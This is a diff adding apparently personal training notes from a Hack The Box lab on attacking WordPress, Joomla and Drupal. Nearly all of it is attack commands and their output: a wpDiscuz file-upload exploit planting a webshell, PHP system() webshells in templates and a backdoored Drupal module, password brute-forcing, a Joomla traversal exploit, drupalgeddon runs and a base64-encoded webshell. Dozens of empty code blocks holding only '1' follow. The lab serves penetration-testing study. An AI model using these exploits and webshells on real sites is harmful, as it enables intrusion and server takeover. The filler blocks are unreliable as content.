@@ -378,10 +378,314 @@ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 ```
 (wpDiscuz)['https://www.exploit-db.com/exploits/49967']
 ```
-1
+mdmithu@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+
+---------------------------------------------------------------
+[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
+[-] File Upload Bypass Vulnerability - PHP Webshell Upload
+[-] CVE: CVE-2020-24186
+[-] https://github.com/hevox
+--------------------------------------------------------------- 
+
+[+] Response length:[102476] | code:[200]
+[!] Got wmuSecurity value: 5c9398fcdb
+[!] Got wmuSecurity value: 1 
+
+[+] Generating random name for Webshell...
+[!] Generated webshell name: uthsdkbywoxeebg
+
+[!] Trying to Upload Webshell..
+[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 
+
+> id
+
+[x] Failed to execute PHP code...
 ```
 ```
-1
+mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+
+GIF689a;
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+## Joomla - Discovery & Enumeration
+```
+mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
+
+    <meta name="generator" content="Joomla! - Open Source Content Management" />
+
+
+<SNIP>
+```
+```
+mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+
+1- What is this?
+    * This is a Joomla! installation/upgrade package to version 3.x
+    * Joomla! Official site: https://www.joomla.org
+    * Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
+    * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
+
+```
+```
+mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+
+<?xml version="1.0" encoding="UTF-8"?>
+<extension version="3.6" type="file" method="upgrade">
+  <name>files_joomla</name>
+  <author>Joomla! Project</author>
+  <authorEmail>admin@joomla.org</authorEmail>
+  <authorUrl>www.joomla.org</authorUrl>
+  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
+  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
+  <version>3.9.4</version>
+  <creationDate>March 2019</creationDate>
+  
+ <SNIP>
+```
+```
+mdmithu@htb[/htb]$ sudo pip3 install droopescan
+
+Collecting droopescan
+  Downloading droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
+     |████████████████████████████████| 514 kB 5.8 MB/s
+     
+```
+```
+mdmithu@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/
+
+[+] Possible version(s):                                                        
+    3.8.10
+    3.8.11
+    3.8.11-rc
+    3.8.12
+    3.8.12-rc
+    3.8.13
+    3.8.7
+    3.8.7-rc
+    3.8.8
+    3.8.8-rc
+    3.8.9
+    3.8.9-rc
+
+[+] Possible interesting urls found:
+    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
+    Login page. - http://dev.inlanefreight.local/administrator/
+    License file. - http://dev.inlanefreight.local/LICENSE.txt
+    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml
+
+[+] Scan finished (0:00:01.523369 elapsed)
+```
+```
+mdmithu@htb[/htb]$ python2 -m pip install bs4
+```
+```
+mdmithu@htb[/htb]$ python2 joomlascan.py -u http://dev.inlanefreight.local
+
+-------------------------------------------
+             Joomla Scan                  
+   Usage: python joomlascan.py <target>    
+    Version 0.5beta - Database Entries 1233
+         created by Andrea Draghetti       
+-------------------------------------------
+Robots file found:       > http://dev.inlanefreight.local/robots.txt
+No Error Log found
+
+Start scan...with 10 concurrent threads!
+Component found: com_actionlogs  > http://dev.inlanefreight.local/index.php?option=com_actionlogs
+     On the administrator components
+Component found: com_admin   > http://dev.inlanefreight.local/index.php?option=com_admin
+     On the administrator components
+Component found: com_ajax    > http://dev.inlanefreight.local/index.php?option=com_ajax
+     But possibly it is not active or protected
+     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml
+     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml
+     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml
+     Explorable Directory    > http://dev.inlanefreight.local/components/com_actionlogs/
+     Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_actionlogs/
+     Explorable Directory    > http://dev.inlanefreight.local/components/com_admin/
+     Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_admin/
+Component found: com_banners     > http://dev.inlanefreight.local/index.php?option=com_banners
+     But possibly it is not active or protected
+     Explorable Directory    > http://dev.inlanefreight.local/components/com_ajax/
+     Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_ajax/
+     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_banners/banners.xml
+
+
+<SNIP>
+```
+```
+mdmithu@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+ 
+admin:admin
+```
+## Attacking Joomla
+
+```
+mdmithu@htb[/htb]$ shell.php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+```
+```
+mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+```
+mdmithu@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+ 
+# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
+# Web Site: Haboob.sa
+# Email: research@haboob.sa
+# Versions: Joomla 1.5.0 through Joomla 3.9.4
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
+ _    _          ____   ____   ____  ____  
+| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
+| |__| |  /  \  | |_) | |  | | |  | | |_) |
+|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
+| |  | |/ ____ \| |_) | |__| | |__| | |_) |
+|_|  |_/_/    \_\____/ \____/ \____/|____/ 
+                                                                       
+
+
+administrator
+bin
+cache
+cli
+components
+images
+includes
+language
+layouts
+libraries
+media
+modules
+plugins
+templates
+tmp
+LICENSE.txt
+README.txt
+configuration.php
+htaccess.txt
+index.php
+robots.txt
+web.config.txt
+```
+## Drupal - Discovery & Enumeration
+
+```
+mdmithu@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal
+
+<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
+      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
+```
+```
+mdmithu@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+
+Drupal 7.57, 2018-02-21
+```
+```
+mdmithu@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
+
+<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>
+```
+```
+mdmithu@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local
+
+[+] Plugins found:                                                              
+    php http://drupal.inlanefreight.local/modules/php/
+        http://drupal.inlanefreight.local/modules/php/LICENSE.txt
+
+[+] No themes found.
+
+[+] Possible version(s):
+    8.9.0
+    8.9.1
+
+[+] Possible interesting urls found:
+    Default admin - http://drupal.inlanefreight.local/user/login
+
+[+] Scan finished (0:03:19.199526 elapsed)
+
+```
+### Attacking Drupal
+
+```
+mdmithu@htb[/htb]$ shell.php
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+
+```
+```
+mdmithu@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+```
+mdmithu@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+```
+```
+mdmithu@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+mdmithu@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
+
+```
+```
+mdmithu@htb[/htb]$ mv shell.php .htaccess captcha
+mdmithu@htb[/htb]$ tar cvf captcha.tar.gz captcha/
+
+captcha/
+captcha/.travis.yml
+captcha/README.md
+captcha/captcha.api.php
+captcha/captcha.inc
+captcha/captcha.info.yml
+captcha/captcha.install
+
+<SNIP>
+```
+```
+mdmithu@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+```
+mdmithu@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+
+<SNIP>
+
+[!] VULNERABLE!
+
+[!] Administrator user created!
+
+[*] Login: hacker
+[*] Pass: pwnd
+[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
+
+```
+(drupalgeddon2.py )['https://www.exploit-db.com/exploits/44448']
+```
+        shellsession
+mdmithu@htb[/htb]$ python3 drupalgeddon2.py 
+
+################################################################
+# Proof-Of-Concept for CVE-2018-7600
+# by Vitalii Rudnykh
+# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
+# https://github.com/a2u/CVE-2018-7600
+################################################################
+Provided only for educational or information purposes
+
+Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
+
+Check: http://drupal-dev.inlanefreight.local/hello.txt
+
+```
+```
+mdmithu@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
 ```
 ```
 1
@@ -408,6 +712,246 @@ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 1
 ```
 
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
+```
+1
+```
 ```
 1
 ```
